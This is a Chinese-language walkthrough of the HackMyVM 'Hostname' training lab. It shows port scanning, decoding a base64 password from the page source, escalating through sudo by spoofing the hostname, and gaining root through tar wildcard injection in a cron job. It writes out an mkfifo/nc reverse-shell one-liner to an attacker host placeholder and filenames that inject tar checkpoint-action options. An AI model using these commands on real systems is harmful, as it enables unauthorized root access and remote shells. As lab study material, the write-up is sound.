难度：简单

链接:<https://hackmyvm.eu/machines/machine.php?vm=Hostname>  

这台靶机是上周刚刚发布的一台靶机，算是蛮新的

攻击手法：

主机发现

端口扫描

sudo提权（伪造主机名）

古老的通配符提权

## 信息收集阶段

### 主机发现

    
    
    zhy@zhy-pc ~ % sudoarp-scan -l    
    Interface: wlan0, type: EN10MB, MAC: dc:1b:a1:ba:dd:3f, IPv4: 192.168.1.100  
    Starting arp-scan 1.9.7 with 256hosts (https://github.com/royhills/arp-scan)  
    192.168.1.1     30:fc:68:d2:72:bc       TP-LINK TECHNOLOGIES CO.,LTD.  
    192.168.1.101   08:00:27:85:91:f2       PCS Systemtechnik GmbH  
    192.168.1.108   0c:70:4a:91:41:1e       HUAWEI TECHNOLOGIES CO.,LTD  
    192.168.1.102   14:85:7f:c4:37:0e       (Unknown)  
    ​  
    5packets received by filter, 0packets dropped by kernel  
    Ending arp-scan 1.9.7: 256hosts scanned in1.966 seconds (130.21 hosts/sec). 4responded

  

### 端口扫描

开放了22和80端口

    
    
    zhy@zhy-pc ~ % sudonmap -p--Pn192.168.1.101                                                                    
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-1310:19 CST  
    Nmap scan report forwarzone.local (192.168.1.101)  
    Host is up (0.000076s latency).  
    Not shown: 65533closed tcp ports (reset)  
    PORT   STATE SERVICE  
    22/tcp open  ssh  
    80/tcp open  http  
    MAC Address: 08:00:27:85:91:F2 (Oracle VirtualBox virtual NIC)  
    ​  
    Nmap done: 1IP address (1 host up) scanned in0.70 seconds  
    zhy@zhy-pc ~ % sudonmap -p22,80 -A-Pn192.168.1.101   
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-1310:19 CST  
    Nmap scan report forwarzone.local (192.168.1.101)  
    Host is up (0.00073s latency).  
    ​  
    PORT   STATE SERVICE VERSION  
    22/tcp open  ssh   OpenSSH 8.4p1 Debian 5(protocol 2.0)  
    | ssh-hostkey:   
    |   307227:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)  
    |   256e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)  
    |_  2565d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)  
    80/tcp open  http    nginx 1.18.0  
    |_http-server-header: nginx/1.18.0  
    |_http-title: Panda  
    MAC Address: 08:00:27:85:91:F2 (Oracle VirtualBox virtual NIC)  
    Warning: OSScan results may be unreliable because we could not findat least 1open and 1closed port  
    Device type: general purpose  
    Running: Linux 4.X|5.X  
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5  
    OS details: Linux 4.15 -5.6  
    Network Distance: 1hop  
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
    ​  
    TRACEROUTE  
    HOP RTT     ADDRESS  
    1 0.73 ms warzone.local (192.168.1.101)  
    ​  
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
    Nmap done: 1IP address (1 host up) scanned in8.29 seconds  
    ​

  

### web信息

发现web界面，发现需要提交Secret Word，对web界面进行有价值的信息收集

查看页面源码发现一段base64编码信息，button标签被打上了disabled属性，这就意味禁用该参数，但是内容不是disabled而是po

    
    
    <divclass="form-group">  
        <pclass="alert">Give Some Input..!!</p>  
        <!-- Kung Fu Panda -->  
        <buttonclass="btn"name="username"disabled="po">Read</button>  
    </div>  
    </form>  
    <linkrel="stylesheet"href="./assets/cool.css"><br><br>  
    <h2style="font-size:4vw"><span>I</span>M<span>POSSIBLE</span></h2>  
    <scriptcrossorigin="S3VuZ19GdV9QNG5kYQ=="src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>  
    <scriptsrc="./assets/script.js"></script>

对base64编码信息进行解码，猜测是我们需要提交的Secret Word

    
    
    255zhy@zhy-pc ~ % echo"S3VuZ19GdV9QNG5kYQ=="| base64 -d  
    Kung_Fu_P4nda

将button标签disabled属性抹出后提交解码后的内容，弹窗现实了一串内容，猜测为22端口ssh服务的密码

尝试是用ssh服务进行登陆，用户名猜测为disabled内容po

    
    
    zhy@zhy-pc ~ % sshpo@192.168.1.101                    
    po@192.168.1.101's password:   
    Linux hostname 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64  
    ​  
    The programs included with the Debian GNU/Linux system are free software;  
    the exact distribution terms foreach program are described inthe  
    individual files in/usr/share/doc/*/copyright.  
    ​  
    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
    permitted by applicable law.  
    Last login: Thu May 1221:38:18 2022from 192.168.1.100  
    po@hostname:~$ 

  

## 提权

### 查看linux版本以及内核，无法利用内核漏洞进行提权

    
    
    po@hostname:~$ uname-a  
    Linux hostname 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64 GNU/Linux

  

### sudo 提权，无法进行提权

显示不能运行在主机hostname上

    
    
    po@hostname:~$ sudo-l  
    [sudo] password forpo:   
    Sorry, user po may not run sudoon hostname.  
    po@hostname:~$ 

  

### 计划任务提权

###### 发现存在一项每分钟执行的计划任务，而且使用tar命令使用了通配符

    
    
    po@hostname:~$ cat/etc/crontab   
    # /etc/crontab: system-wide crontab  
    # Unlike any other crontab you don't have to run the `crontab'  
    # command to install the new version when you edit this file  
    # and files in /etc/cron.d. These files also have username fields,  
    # that none of the other crontabs do.  
    ​  
    SHELL=/bin/sh  
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin  
    ​  
    # Example of job definition:  
    # .---------------- minute (0 - 59)  
    # |  .------------- hour (0 - 23)  
    # |  |  .---------- day of month (1 - 31)  
    # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...  
    # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat  
    # |  |  |  |  |  
    # *  *  *  *  * user-name command to be executed  
    *  *    * * *   root    cd/opt/secret/ && tar -zcf/var/backups/secret.tgz *  
    17*    * * *   root    cd/ && run-parts --report/etc/cron.hourly  
    256  * * *   root    test -x/usr/sbin/anacron || ( cd/ && run-parts --report/etc/cron.daily )  
    476  * * 7 root    test -x/usr/sbin/anacron || ( cd/ && run-parts --report/etc/cron.weekly )  
    526  1* *   root    test -x/usr/sbin/anacron || ( cd/ && run-parts --report/etc/cron.monthly )

进入到/opt/secret目录下，发现po用户并没有写入权限，需要提权到oogway

    
    
    po@hostname:/opt/secret$ ls-la  
    total 20  
    drwxrwxr-x 2root   oogway 4096May 1221:46  .  
    drwxrwxr-x 3root   oogway 4096Apr 2114:27  ..  
    po@hostname:/opt/secret$   
    ​

进行sudo提权时提示 may not run sudo on hostname

以此为基础进行内网信息收集

    
    
    po@hostname:/etc$ ls-la| grepsudo  
    -rw-r--r--1root root    3975Feb 272021sudo.conf  
    -r--r-----1root root     669Feb 272021sudoers  
    drwxr-xr-x  2root root    4096Apr 2110:02 sudoers.d  
    -rw-r--r--1root root    6169Feb 272021sudo_logsrvd.conf

发现suoers.d目录我们是可以访问的（一般情况是不允许普通用户访问）

    
    
    po@hostname:/etc$ cdsudoers.d/  
    po@hostname:/etc/sudoers.d$ ls  
    po  README  
    po@hostname:/etc/sudoers.d$ catpo   
    po HackMyVM =(oogway) NOPASSWD: /bin/bash

查看文件里po内容，是允许po在HackMyVM主机名下不需要输入密码使用oogway用户执行/bin/bash命令

使用sudo命令提权

    
    
    po@hostname:/etc/sudoers.d$ sudo-uoogway -hHackMyVM /bin/bash  
    sudo: unable to resolve host HackMyVM: Name or servicenot known  
    oogway@hostname:/etc/sudoers.d$ id  
    uid=1001(oogway) gid=1001(oogway) groups=1001(oogway)  
    oogway@hostname:/etc/sudoers.d$ 

虽然提示未知的服务名字，但是命令还是执行成功提升为了oogway权限

查看flag

    
    
    oogway@hostname:~$ pwd  
    /home/oogway     
    oogway@hostname:~$ catuser.txt   
    081ecc5e6dd6ba***********0e62ec50

  

### 通配符提权

攻击机上开启监听

    
    
    nc-nvlpport

/opt/secret下执行命令

    
    
    echo"mkfifo /tmp/lhennp; nc hackip hackport 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&amp1 rm /tmp/lhennp"> shell.sh  
    echo""> "--checkpoint-action=exec=sh shell.sh"  
    echo""> --checkpoint=1

等待回连

    
    
    zhy@zhy-pc ~ % nc-nvlpport  
    Connection from 192.168.1.101:59670  
    python3 -c"import pty;pty.spawn('/bin/bash')"  
    root@hostname:/opt/secret# id  
    id  
    uid=0(root) gid=0(root) groups=0(root)

提升shell

    
    
    python3 -c"import pty;pty.spawn('/bin/bash')"

查看oogway下的flag

    
    
    root@hostname:~# pwd  
    pwd  
    /root  
    root@hostname:~# cat root.txt  
    catroot.txt  
    d5806296126a********aa172ff9c9151  
    ​

  

## 总结：

靶机难度不难，主要是两个提权过程，sudo提权对本人来说是收获了一种新的姿势，通配符提权已经是老生常谈的一种提权姿势，新老结合，蛮有趣的。

